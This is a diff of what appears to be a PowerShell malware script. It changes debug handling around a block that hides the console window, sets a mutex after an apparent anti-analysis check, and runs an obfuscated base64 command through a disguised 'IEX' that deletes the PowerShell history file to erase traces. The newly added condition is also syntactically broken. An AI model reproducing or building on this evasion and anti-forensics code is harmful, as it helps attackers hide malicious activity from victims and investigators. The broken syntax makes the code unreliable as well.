@@ -1,4 +1,4 @@
-$debug = $true
+$debug = $false
 
 if ($debug) {
     $ErrorActionPreference = 'Stop'
@@ -887,8 +887,13 @@ function Invoke-TASKS {
 }
 
 if (INVOKE-AC -eq $true) {
-    Hide-Console
-    KDMUTEX
+    if $debug -eq $true {
+        KDMUTEX
+    }
+    else {
+        Hide-Console
+        KDMUTEX
+    }
     #removes history
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
 }
